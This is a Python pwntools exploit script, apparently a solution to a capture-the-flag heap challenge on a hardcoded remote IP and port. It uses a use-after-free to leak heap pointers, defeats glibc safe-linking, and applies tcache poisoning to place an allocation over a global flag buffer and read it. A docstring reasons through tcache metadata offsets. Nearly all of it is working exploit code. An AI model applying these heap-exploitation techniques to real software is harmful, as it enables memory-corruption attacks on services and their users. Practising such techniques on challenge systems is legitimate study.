#!/usr/bin/env python3
"""
Final attempt: The tcache poisoning WORKS when targeting X.
The issue is that negative offsets (where g_flag should be) cause crashes.

Key realization: maybe the issue is that the chunk at g_flag has its
key field set to a non-zero value (because flag content was written there).
In glibc 2.32+, when freeing, it checks if key == tcache_key.
But when ALLOCATING from tcache, it just clears the key.

Wait - maybe the issue is that the tcache_perthread_struct itself
gets corrupted. The tcache_perthread_struct is at heap_base,
and g_flag is at heap_base + 0x2a0. The tcache_perthread_struct
ends at heap_base + 0x290. So g_flag is right after it.

When we target X - 0x90, we're targeting heap_base + 0x2a0 - 0x90 = heap_base + 0x210
which is INSIDE the tcache_perthread_struct!

So the correct approach is: g_flag = X (the first user allocation).
But when we read from X, the first 16 bytes are tcache metadata.

The flag IS at X, but the first 16 bytes are overwritten by tcache.

Let me try: create spell at X via tcache poisoning, then read bytes 16+ to get the flag!
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = b''
    while len(data) < size:
        chunk = p.recv(size - len(data), timeout=3)
        if not chunk:
            break
        data += chunk
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')

# g_flag = X (first user alloc, where spell 0 ends up)
# But we need to avoid tcache metadata overwriting the flag

# Strategy: create spell 0, banish, read to get X
# Then create spell 1 (at X) and spell 2 (at new addr)
# Banish both, do tcache poisoning to return X
# Read from X - the first 16 bytes are tcache metadata, but bytes 16+ are the flag!

# Step 1: Get X
create(p, 0, 0x80, b'A' * 0x10 + b'\n')
banish(p, 0)
data = recite(p, 0, 0x80)
fd0 = u64(data[0:8])
X = fd0 << 12
log.info(f"X = {hex(X)}")

# Step 2: Reuse X for spell 1
create(p, 1, 0x80, b'B' * 0x10 + b'\n')

# Step 3: Create spell 2 at new address
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

# Step 4: Banish both
banish(p, 1)
banish(p, 2)

# Step 5: Read UAF to get spell2 addr
data = recite(p, 2, 0x80)
fd2 = u64(data[0:8])
spell2_shifted = fd2 ^ X
log.info(f"spell2_shifted = {hex(spell2_shifted)}")

# Step 6: Target X (which is g_flag!)
target = X
protected = spell2_shifted ^ target
log.info(f"protected = {hex(protected)}")
payload = p64(protected) + b'\x00' * (0x80 - 8)
edit(p, 2, 0x80, payload)

# Step 7: Alloc spell 3 (returns spell2)
create(p, 3, 0x80, b'D' * 0x10 + b'\n')

# Step 8: Alloc spell 4 (returns X = g_flag!)
# Send just newline to preserve the flag content
create(p, 4, 0x80, b'\n')

# Step 9: Read spell 4 - first 16 bytes are tcache metadata, rest is flag
log.info("Reading spell 4 (at g_flag)")
data = recite(p, 4, 0x80)
log.info(f"Full data hex: {data.hex()}")

# The first 16 bytes are tcache metadata (fd + key)
# The flag should be at bytes 16+
# But wait - the create function writes our data to the buffer!
# Since we sent '\n', only 1 byte is written. The rest is preserved.

# Actually, the create function reads byte by byte until newline or size.
# So it reads the '\n' and stops. The buffer is NOT modified.
# But the tcache already cleared the key (8 bytes at offset 8).

# So:
# Bytes 0-7: protected value (from tcache)
# Bytes 8-15: 0 (key cleared by tcache)
# Bytes 16-127: original flag content!

flag_data = data[16:]
log.info(f"Flag data (bytes 16+): {flag_data}")
try:
    text = flag_data.decode('latin-1')
    log.info(f"Flag text: {text}")
except:
    pass

# Also check bytes 8-15
log.info(f"Bytes 8-15 (should be 0): {data[8:16].hex()}")

p.sendline(b'0')
p.close()
